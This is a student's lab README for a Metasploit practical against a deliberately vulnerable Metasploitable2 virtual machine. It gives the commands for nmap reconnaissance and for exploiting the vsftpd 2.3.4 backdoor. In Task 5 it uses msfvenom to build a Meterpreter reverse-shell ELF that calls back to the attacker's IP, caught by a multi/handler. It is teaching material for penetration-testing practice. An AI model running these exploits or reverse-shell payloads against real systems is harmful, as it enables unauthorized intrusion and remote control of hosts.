# Metasploit Practical Assignment

**Submitted By:** Shivansh Kuntal
**Practical Title:** Hands-On Exploitation Using the Metasploit Framework

---

## 📌 Objective

The purpose of this practical is to perform controlled penetration testing using the **Metasploit Framework**, exploit a known vulnerability on a intentionally vulnerable machine (**Metasploitable2**), and practice post-exploitation and payload delivery.

This practical reinforces core penetration testing skills and introduces real-world exploitation workflow in a safe lab environment.

---

## 🎯 Learning Outcomes

By the end of this experiment, the student will be able to:

* Use Metasploit modules effectively
* Perform enumeration and vulnerability scanning
* Exploit a known service vulnerability
* Gain shell access on a target system
* Execute basic post-exploitation commands
* Generate and handle reverse shell payloads using `msfvenom`
* Understand the attacker workflow end to end

---

## 🧪 Lab Setup

### **Attacker Machine**

* Kali Linux / Parrot OS
* Metasploit Framework pre-installed

### **Target Machine**

* Metasploitable2
  [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

### **Network Configuration**

* VirtualBox or VMware
* NAT or Host-Only Adapter
* Both machines must be on the same virtual network

---

# 🔧 Practical Tasks

---

## **Task 1: Starting Metasploit Framework**

Launch Metasploit:

```bash
msfconsole
```

**Expected Observation:**
Metasploit banner with version info and module counts.

📷 *Screenshot 1: msfconsole launch screen*

---

## **Task 2: Information Gathering using Nmap**

### **Step 1: Identify the target IP**

```bash
ifconfig
```

### **Step 2: Scan the Metasploitable2 machine**

```bash
nmap -sS -sV [Target-IP]
```

**Key Findings:**
Common open ports on Metasploitable2 usually include:

* **21** – FTP
* **22** – SSH
* **23** – Telnet
* **80** – HTTP
* **445** – SMB
* **3306** – MySQL
* **5432** – PostgreSQL

📷 *Screenshot 2: Nmap scan output*

---

## **Task 3: Exploiting vsftpd v2.3.4 Backdoor**

This vulnerability exists in a malicious version of vsftpd where connecting with a username ending in `:)` triggers a backdoor shell on port 6200.

### **Step-by-Step Exploitation**

```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST [Target-IP]
exploit
```

**Expected Result:**
A command shell session opens, confirming the exploit succeeded.

📷 *Screenshot 3: Successful vsftpd backdoor exploit*

---

## **Task 4: Post-Exploitation Commands**

Once inside the target:

```bash
whoami
uname -a
hostname
```

These commands confirm privilege level, OS version, and machine identity.

📷 *Screenshot 4: Output of post-exploitation commands*

---

## **Task 5: Creating & Delivering a Payload (Advanced)**

This step demonstrates generating a reverse shell payload using **msfvenom** and catching it using Metasploit’s multi/handler.

### **Step 1: Generate Payload**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your-IP] LPORT=4444 -f elf > shell.elf
```

### **Step 2: Start Multi/Handler**

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST [Your-IP]
set LPORT 4444
run
```

### **Step 3: Execute Payload on Target**

Transfer and run `shell.elf` on the target machine.

**Expected Result:**
A Meterpreter session opens.

📷 *Screenshot 5: Meterpreter session active*

---

# 🔍 Summary of Findings

* Metasploit quickly identified and exploited the vulnerable **vsftpd v2.3.4** service.
* Successful exploitation provided remote shell access.
* Post-exploitation commands confirmed system details.
* Payload creation and handling with msfvenom demonstrated real-world reverse shell techniques.
* This practical recreated an authentic penetration testing workflow within a safe environment.

---

# ✅ Conclusion

This experiment provided hands-on experience with:

* Metasploit module search, configuration, and execution
* Network reconnaissance using Nmap
* Exploitation of a known service vulnerability
* Interactive shell access on a compromised host
* Reverse shell payload creation using msfvenom
* Understanding exploitation stages in a structured penetration test

The tasks completed cover essential red-team skills required for offensive security, ethical hacking, and cybersecurity lab work.


**End of README**

